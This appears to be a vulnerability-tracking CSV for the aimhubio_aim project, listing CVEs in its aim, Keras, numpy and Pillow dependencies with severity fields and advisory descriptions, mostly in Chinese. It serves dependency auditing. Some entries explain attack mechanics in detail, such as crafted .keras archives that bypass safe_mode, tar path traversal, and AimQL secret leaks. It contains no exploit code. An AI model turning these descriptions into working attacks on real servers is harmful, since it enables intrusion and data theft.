project,dependency,dependency_version,direct_dependency,cve_id,cwe_id,release_date,description,security_level_id,exploit_level_id
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-8061,CWE-1088,,Aim是美国Aim开源的一个易于使用和高性能的开源实验跟踪器。Aim 3.23.0版本存在资源管理错误漏洞，源于某些请求外部服务器数据的方法未设置超时，导致服务器无限期等待响应。这可能引发拒绝服务，因为跟踪服务器在等待响应期间无法响应其他请求。该问题出现在`aim`跟踪服务器与外部资源通信时使用的客户端中，具体在`_run_read_instructions`方法及类似调用中未设置超时。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-12777,CWE-1088,,Aim是一个开源实验跟踪器，旨在提供易用性和高性能。版本3.25.0存在安全漏洞，该漏洞源于未为sshfs-client设置超时，导致跟踪服务器无响应。当请求连接到一个无响应的socket时，单线程的跟踪服务器会因为缺少超时设置卡住，导致长时间无法响应其他请求。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-6483,CWE-23,,Aim是美国Aim开源的一个易于使用和高性能的开源实验跟踪器。Aim 3.19.3版本的`runs/delete-batch`接口存在安全漏洞，攻击者可以通过路径遍历实现任意文件或目录的删除。此接口在处理用户指定的运行名称时没有缓解路径遍历，可能导致敏感文件的意外删除，从而引发拒绝服务或数据丢失。,3,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-6829,CWE-73,,Aim 是 aimhubio 开发的一个高性能开源实验跟踪器，用于跟踪机器学习实验和模型的性能。Aim 版本 3.19.3 存在一个安全漏洞，攻击者可以利用 `tarfile.extractall()` 函数将恶意构造的 tar 文件的内容提取到主机服务器的任意位置。攻击者可以控制 `repo.path` 和 `run_hash`，从而绕过目录存在性检查，将文件提取到意想不到的位置，可能会覆盖关键文件。这可能导致任意数据被写入远程跟踪服务器的任意位置，可用于进一步攻击，如在目标服务器上写入新的 SSH 密钥。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-12778,CWE-770,2025-03-20,aimhubio/aim 是一个用于跟踪和管理机器学习指标的开源工具。该漏洞影响版本 3.25.0，当通过 Aim 网页 API 同时检索大量被跟踪的指标时，可能导致 web 服务器无法响应。其根本原因在于缺乏对每次请求可以请求的指标数量的限制，加上服务器的单线程特性，导致资源消耗过大，最终阻塞服务器。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-2195,CWE-94,,Aim 是一个易于使用和高性能的开源实验跟踪器。该组件允许用户记录、搜索和比较人工智能实验。漏洞源于对 RunView 对象的用户访问控制不当，攻击者可以通过在 /api/runs/search/run/ 端点中操控 query 参数执行任意命令。具体而言，攻击者可以构造代码片段并通过 API 调用影响服务器的行为。,1,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-6396,CWE-29,,Aim是一个易于使用的开源实验跟踪器，旨在记录、搜索和比较AI实验。Aim 3.19.3版本存在安全漏洞，该漏洞源自备份运行功能中的参数处理不当，允许攻击者利用 `run_hash` 和 `repo.path` 参数来覆盖主机服务器上的任意文件，并窃取任意数据。这一漏洞可以被滥用以导致服务拒绝，窃取私密数据，以及通过下载私密ssh密钥实现远程代码执行的可能性。,1,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-8238,CWE-1336,,Aim 是一个由 Aimhubio 开发的开源实验跟踪器，具有易于使用和高性能的特性。在 Aim 3.22.0 版本中，AimQL 查询语言使用了过时的 safer_getattr() 函数，未能保护 str.format_map() 方法，因此攻击者可以利用该漏洞泄露服务器端秘密，或获取任意代码执行的能力。该漏洞的根源在于 str.format_map() 方法可以读取任意 Python 对象的属性，攻击者可以访问敏感变量，例如 os.environ。如果攻击者能够向 Aim 服务器上的已知位置写入文件，他们可以利用 str.format_map() 加载恶意的 .dll/.so 文件到 Python 解释器中，从而导致不受限制的代码执行。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-2196,CWE-352,,Aim 是一个易于使用和高性能的开源实验跟踪器，旨在记录、搜索和比较人工智能实验。由于在 Aim 控制面板中缺乏 CSRF 和 CORS 保护，Aim 存在跨站请求伪造漏洞。攻击者可以通过欺骗用户执行恶意脚本，向 Aim 服务器发送未授权请求，从而导致数据丢失和未授权的数据操作，如删除运行记录和更新数据等。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2025-0190,CWE-1049,,在aimhubio/aim的3.25.0版本中存在一个拒绝服务漏洞。该组件是一个用于跟踪和管理机器学习实验的开源项目，允许用户通过Web API与跟踪的对象进行交互。漏洞的根本原因是对大量`Text`对象的跟踪，攻击者可以通过通过Web API同时查询这些对象，从而使Aim Web服务器在处理请求时对其他请求无响应，导致长时间停机。此漏洞可被恶意用户重复利用，造成完全的拒绝服务。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-6227,CWE-835,,Aim 是一个开源的实验跟踪工具，致力于简化 AI 实验的记录和管理。第 3.19.3 版本存在资源管理错误漏洞，攻击者可以将远程跟踪服务器配置为指向自身，导致服务器进入无限连接循环，从而无法处理其他合法请求。这种配置错误使得服务器失去了响应能力，造成拒绝服务。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2025-0189,CWE-770,,aimhubio/aim 是一个用于跟踪和管理图像的开源项目。版本 3.25.0 的跟踪服务器存在拒绝服务漏洞。该漏洞的根本原因在于服务器对 websocket 消息的最大大小进行了重写，允许跟踪非常大的图像。这导致服务器在处理大图像期间对其他请求无响应，从而造成拒绝服务状态。,2,1
aimhubio_aim,aim,>=3.0.0,True,CVE-2024-8863,CWE-79,2024-09-14,"Aim是美国Aim开源的一个易于使用和高性能的开源实验跟踪器。
Aim 3.24版本及之前版本存在安全漏洞，该漏洞源于对参数 query 的错误操作会导致跨站点脚本攻击。",3,0
aimhubio_aim,aim,>=3.0.0,True,CVE-2025-5321,CWE-264 CWE-265,2025-05-29,在aimhubio的aim版本3.29.1及之前的版本中，发现了一个被评估为关键级别的漏洞。这个漏洞影响了组件run_view Object Handler中的文件/aim/storage/query.py的RestrictedPythonQuery函数。对Query参数进行操作会导致沙箱问题。,3,0
aimhubio_aim,Keras,2.2.4,True,,CWE-502,2021-08-05,"## Overview
[keras](https://github.com/keras-team/keras) is a Keras is a high-level neural networks API for Python..

Affected versions of this package are vulnerable to Deserialization of Untrusted Data. Loading keras models via yaml could allow arbitrary code execution via unsafe deserialization.

## Details

Serialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.

_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.
  
## Remediation
Upgrade `keras` to version 2.6.0rc3 or higher.
## References
- [GitHub Release](https://github.com/keras-team/keras/releases/tag/v2.6.0-rc3)
",2,2
aimhubio_aim,Keras,2.2.4,True,CVE-2024-3660,CWE-94,2024-04-16,<p>TensorFlow Keras是TensorFlow开源的一个框架。为解决机器学习问题提供了一个可接近、高效的界面。 TensorFlow Keras 2.13之前版本存在安全漏洞，该漏洞源于存在任意代码注入漏洞，允许攻击者执行任意代码。</p>,1,1
aimhubio_aim,Keras,2.2.4,True,CVE-2025-8747,CWE-502,2025-08-11,Keras 是一个用于深度学习的高层神经网络 API，广泛应用于机器学习模型的构建和训练。其 `Model.load_model` 方法用于加载模型文件，支持从磁盘或其他存储位置导入预训练模型。漏洞存在于 Keras 版本 3.0.0 至 3.10.0 中的 `Model.load_model` 方法，该方法的安全模式存在绕过问题。攻击者可通过诱导用户加载特制的 `.keras` 模型文件，触发反序列化问题（CWE-502），从而执行任意代码。漏洞的成因在于组件未正确校验输入数据的可信性，导致恶意模型文件中的代码能够在加载过程中被执行。,2,0
aimhubio_aim,Keras,2.2.4,True,CVE-2025-9906,CWE-502,2025-09-19,Keras 是一个高层神经网络 API，用于搭建深度学习模型。其 Model.load_model 方法允许从存储的 .keras 模型文件中加载模型。该方法中存在一个漏洞，即使在 safe_mode=True 的情况下，攻击者也可通过特制的 .keras 模型文件实现任意代码执行。此漏洞的核心成因是 .keras 文件中的 config.json 文件可以调用 keras.config.enable_unsafe_deserialization() 方法来禁用安全模式。一旦禁用，攻击者即可利用 Keras 的 Lambda 层功能插入任意 Python 代码（以序列化形式存在）。触发条件是攻击者需要将 config.json 文件放在归档文件的第一位置，Lambda 层的恶意代码放在第二位置。,2,0
aimhubio_aim,Keras,2.2.4,True,CVE-2025-9905,CWE-913,2025-09-19,"Keras 是一个高层神经网络 API，通常用于构建深度学习模型。其 `Model.load_model` 方法支持加载 .h5/.hdf5 文件格式的模型，这是 Keras 3 提供的向后兼容的遗留功能。漏洞的根源在于，当使用 `safe_mode=True` 选项加载 .h5/.hdf5 文件时，Keras 未正确验证文件的安全性，从而允许攻击者通过构造特制的恶意 .h5/.hdf5 模型文件，实现任意代码执行。

此漏洞利用了 Keras 中的 Lambda 层特性，该特性支持任意 Python 代码的序列化（pickle）。攻击者可以在恶意文件中嵌入恶意的 Python 代码片段，该代码将在加载模型文件时被执行。尽管 `safe_mode=True` 的目的是防止不安全的 Lambda 反序列化，但该选项在处理 .h5/.hdf5 文件时被忽略，导致用户误认为加载是安全的。

从技术上来看，问题出在 Keras 的 `legacy_h5_format.load_model_from_hdf5` 实现中，该方法完全忽略了 `safe_mode` 参数的存在，并直接加载文件中的内容。此行为为攻击者提供了代码执行的入口。",2,-2
aimhubio_aim,Keras,2.2.4,True,CVE-2024-55459,CWE-494,2025-01-08,"Keras是Keras开源的一个多后端深度学习框架。
Keras 3.7.0版本存在安全漏洞，该漏洞源于允许攻击者通过get_file函数下载精心设计的tar文件，从而将任意文件写入用户的计算机。",3,0
aimhubio_aim,Keras,2.2.4,True,CVE-2025-1550,CWE-94,2025-03-11,"Keras 是一个用于构建和训练深度学习模型的高层神经网络 API。其 Model.load_model 函数的 safe_mode 功能原本设计为防止不安全的 lambda 反序列化，但存在漏洞。攻击者可以通过手动构造的恶意 .keras 存档，修改其中的 config.json 文件，在模型加载过程中指定任意 Python 模块及其函数和参数，从而实现任意代码执行。

漏洞的成因是 Keras 在加载模型时未对内部模块函数的调用进行充分验证，允许攻击者利用 Keras 内置函数（如 keras.utils.get_file）来执行恶意操作，例如下载远程文件并覆盖本地文件。即使 safe_mode 启用，该漏洞仍然可被利用，因为它依赖于对批准模块的滥用。

影响范围包括默认配置的 Keras 环境，且不需要用户输入，攻击者只需提供恶意模型文件即可触发漏洞。",2,1
aimhubio_aim,Keras,2.2.4,True,CVE-2025-12058,CWE-502,2025-10-29,Keras 是一个广泛使用的深度学习框架，主要用于构建和训练神经网络模型。Keras.Model.load_model 方法用于加载已保存的模型，包括特定格式的 .keras 存档文件。在深度学习开发中，该方法通常用于快速恢复训练模型或部署预训练模型。漏洞源于 StringLookup 层在模型加载过程中的处理方式。StringLookup 层的构造函数接受一个 vocabulary 参数，可以指定本地文件路径或远程文件路径。攻击者可以创建一个恶意的 .keras 文件，在其配置中嵌入本地文件路径，从而导致 Keras 在加载模型时尝试读取指定的本地文件内容并将其融入模型状态（例如通过 get_vocabulary() 方法检索）。此外，由于 Keras 使用 TensorFlow 的 tf.io.gfile 进行文件操作，该模块支持远程文件系统（如 GCS 和 HDFS）以及 HTTP/HTTPS 协议，这允许攻击者通过同样的机制从任意网络端点获取内容，从而实施 SSRF 攻击。漏洞的根本原因是 safe_mode=True 标志未能有效限制外部路径加载功能，导致意外的数据访问风险。,3,0
aimhubio_aim,Keras,2.2.4,True,CVE-2025-12060,CWE-22,2025-10-30,"Keras 是一个广泛使用的高级框架，用于构建和训练深度学习模型。其 utils.get_file API 提供了从 URL 下载文件的功能，并支持自动解压文件。当使用 extract=True 参数解压 tar 格式文件时，该功能存在路径遍历漏洞。具体来说，工具函数调用了 Python 的 tarfile.extractall 方法，但没有启用关键的过滤功能（filter=""data""）。这使攻击者可以通过构造恶意的 tar 存档（包含特殊符号链接），实现任意文件写入到文件系统中的任意路径。该漏洞的根本原因是缺乏对解压文件路径的校验，结合 Python tarfile 模块中的已知缺陷（CVE-2025-4517），攻击者能够利用这一漏洞。即便升级 Python 到修复版本（例如 Python 3.13.4），仍需升级 Keras 到安全版本（Keras 3.12）才能彻底解决问题。",2,2
aimhubio_aim,numpy,1.21.0,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
aimhubio_aim,numpy,1.21.0,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
aimhubio_aim,Pillow,>=7.1.0,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
aimhubio_aim,Pillow,>=7.1.0,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
aimhubio_aim,Pillow,>=7.1.0,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2022-30595,CWE-787,2022-05-17,"Pillow是一款基于Python的图像处理库。
Pillow 9.1.0 版本存在安全漏洞，该漏洞源于在处理TGA文件时存在边界错误。远程攻击者利用该漏洞可以将专门设计的数据传递给应用程序，触发基于堆的缓冲区溢出，并在目标系统上执行任意代码。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-25292,CWE-1333,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于PDF解析器允许通过一个特制的PDF文件进行正则表达式DoS（ReDoS）攻击。",3,0
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
